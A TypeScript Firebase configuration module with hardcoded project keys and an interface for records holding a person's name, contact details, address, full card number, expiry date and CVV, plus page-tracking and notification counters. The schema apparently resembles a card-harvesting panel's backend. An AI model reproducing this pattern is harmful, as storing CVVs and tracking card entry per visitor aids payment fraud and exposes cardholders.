import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore} from 'firebase/firestore';
import { getDatabase} from 'firebase/database';

const firebaseConfig = {
  apiKey: "AIzaSyCWXJUL9vXubuwTynne5NaEI3FZPHs5PD8",
  authDomain: "shael-4047b.firebaseapp.com",
  projectId: "shael-4047b",
  storageBucket: "shael-4047b.firebasestorage.app",
  messagingSenderId: "415690147413",
  appId: "1:415690147413:web:76c28d07cacafd66c836dc",
  measurementId: "G-D5ZBVF0DKD"
};


const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);


export { app, auth, db ,database};

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}

